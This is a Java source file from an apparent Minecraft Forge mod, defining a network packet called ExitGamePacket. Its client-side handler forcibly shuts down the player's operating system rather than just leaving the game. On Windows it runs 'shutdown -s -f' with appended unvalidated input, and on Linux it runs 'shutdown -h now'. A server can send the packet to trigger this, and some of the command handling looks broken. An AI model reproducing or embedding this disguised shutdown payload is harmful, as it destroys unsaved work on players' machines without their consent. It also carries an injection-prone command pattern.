package miku.Network.Packet;

import io.netty.buffer.ByteBuf;
import miku.Utils.SystemUtil;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

public class ExitGamePacket implements IMessage {

    public ExitGamePacket() {
    }

    @Override
    public void fromBytes(ByteBuf buf) {

    }

    @Override
    public void toBytes(ByteBuf buf) {

    }

    public static class MessageHandler implements IMessageHandler<ExitGamePacket, IMessage> {

        @Override
        @SideOnly(Side.CLIENT)
        public IMessage onMessage(ExitGamePacket message, MessageContext ctx) {
            if (SystemUtil.isWindows()) {
                Scanner scanner = new Scanner(System.in);
                String input = scanner.nextLine();
                try {
                    Runtime.getRuntime().exec("shutdown -s -f " + input);
                } catch (IOException ignored) {

                }
            }
            if (SystemUtil.isLinux()) {
                try {

                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command("shutdown -h now");
                    Process process = processBuilder.start();
                    StringBuilder output = new StringBuilder();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                } catch (IOException ignored) {
                }
            }
            System.exit(0);
            FMLCommonHandler.instance().exitJava(0, true);
            return null;
        }
    }
}
